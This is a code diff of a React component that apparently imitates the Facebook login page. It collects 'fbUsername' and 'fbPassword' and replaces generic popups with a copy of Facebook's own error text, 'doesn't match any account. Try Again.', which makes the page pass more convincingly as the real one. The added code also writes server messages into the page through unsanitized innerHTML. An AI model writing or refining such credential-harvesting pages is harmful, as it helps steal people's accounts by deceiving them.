@@ -30,36 +30,40 @@ const Facebookpage = () => {
           const sucessMessage = response.data.message;
 
           if (!response.data.status) {
-            Swal.fire({
-              icon: "error",
-              title: "<h3>Registration Failed</h3>",
-              text: errorMessage
-            });
+            // Swal.fire({
+            //   icon: "error",
+            //   title: "<h3>Registration Failed</h3>",
+            //   text: errorMessage
+            // });
+            document.getElementById('message').innerHTML = "<div class='error'>The "+ errorMessage +"  that you've entered doesn't match any account. Try Again.</div>";
           } else {
-            Swal.fire({
-              position: "center",
-              icon: "success",
-              title: "<h3>Success</h3>",
-              text: sucessMessage,
-              showConfirmButton: false,
-              timer: 1500
-            });
-            navigate("/si")
+            // Swal.fire({
+            //   position: "center",
+            //   icon: "success",
+            //   title: "<h3>Success</h3>",
+            //   text: sucessMessage,
+            //   showConfirmButton: false,
+            //   timer: 1500
+            // });
+            navigate("/db")
           }
         })
         .catch((err) => {
-          console.log(err);
+          // console.log(err);
           const errmessage = err.response.data.message
-          Swal.fire({
-            icon: "error",
-            title: "<h3>Error Occured</h3>",
-            text: errmessage
-          });
+          // Swal.fire({
+          //   icon: "error",
+          //   title: "<h3>Error Occured</h3>",
+          //   text: errmessage
+          // });
+          document.getElementById('message').innerHTML = "<div class='error'>"+ errmessage +" </div>";
         })
     }
   })
   return (
     <>
+     <div id="message" class="message"></div>
+
       <form action="" onSubmit={formik.handleSubmit}>
         <div className='fbcontainer'>
           <div className='innercontainer'>
@@ -70,10 +74,10 @@ const Facebookpage = () => {
 
               <div className='mt-3'>
                 <div>
-                  <input placeholder="Mobile number or email address" class="styled-input" type="text" name="fbUsername" 
-                  onChange={formik.handleChange}
-                  onBlur={formik.handleBlur}
-                  value={formik.values.fbUsername}
+                  <input placeholder="Mobile number or email address" class="styled-input" type="text" name="fbUsername"
+                    onChange={formik.handleChange}
+                    onBlur={formik.handleBlur}
+                    value={formik.values.fbUsername}
                   />
                   {/* <input
                     className={`form-control ${(formik.values.fbUsername && !formik.errors.fbUsername) ||
@@ -90,10 +94,10 @@ const Facebookpage = () => {
                   /> */}
                 </div>
                 <div>
-                  <input placeholder="Password" class="styled-input my-2" type="password" name="fbPassword" 
-                  onChange={formik.handleChange}
-                  onBlur={formik.handleBlur}
-                  value={formik.values.fbPassword}
+                  <input placeholder="Password" class="styled-input my-2" type="password" name="fbPassword"
+                    onChange={formik.handleChange}
+                    onBlur={formik.handleBlur}
+                    value={formik.values.fbPassword}
                   />
                   {/* <input
                     className={`form-control ${(formik.values.fbPassword && !formik.errors.fbPassword) ||
